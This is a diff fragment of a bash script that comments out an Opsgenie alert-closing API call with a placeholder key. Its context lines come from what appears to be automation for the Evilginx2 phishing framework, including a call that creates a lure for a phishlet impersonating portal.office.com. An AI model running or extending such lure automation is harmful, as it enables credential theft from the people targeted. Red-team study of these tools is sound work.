@@ -47,25 +47,22 @@ default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 # Automate multiple lure creation
 create_lure $default_phishlet $domain_name "https://portal.office.com"
 
-
-#!/bin/bash
-
-# Define your Opsgenie API key
-API_KEY="YOUR_OPSGENIE_API_KEY"
+# # Define your Opsgenie API key
+# API_KEY="YOUR_OPSGENIE_API_KEY"
 
 
-# Define the Opsgenie API endpoint for updating alerts
-ALERT_ID="f47c229b-1234-5678-910a-bcdefghijklmn"  # Replace with actual alert ID
-API_URL="https://api.opsgenie.com/v2/alerts/$ALERT_ID/close"
+# # Define the Opsgenie API endpoint for updating alerts
+# ALERT_ID="f47c229b-1234-5678-910a-bcdefghijklmn"  # Replace with actual alert ID
+# API_URL="https://api.opsgenie.com/v2/alerts/$ALERT_ID/close"
 
-# Send the request to close the alert
-response=$(curl -s -X POST "$API_URL" \
-  -H "Authorization: GenieKey $API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{
-        "user": "user@example.com",
-        "note": "Closing the alert from Bash"
-      }')
+# # Send the request to close the alert
+# response=$(curl -s -X POST "$API_URL" \
+#   -H "Authorization: GenieKey $API_KEY" \
+#   -H "Content-Type: application/json" \
+#   -d '{
+#         "user": "user@example.com",
+#         "note": "Closing the alert from Bash"
+#       }')
 
-# Output the response from the API
-echo "Response: $response"
+# # Output the response from the API
+# echo "Response: $response"
